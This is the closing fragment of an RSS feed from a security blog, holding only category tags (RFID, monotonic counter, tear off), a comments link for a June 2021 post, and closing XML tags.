      <category domain="https://hackyboiz.github.io/tags/rfid/">rfid</category>
      
      <category domain="https://hackyboiz.github.io/tags/monotonic-counter/">monotonic counter</category>
      
      <category domain="https://hackyboiz.github.io/tags/tear-off/">tear off</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/09/fabu1ous/2021-06-09/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
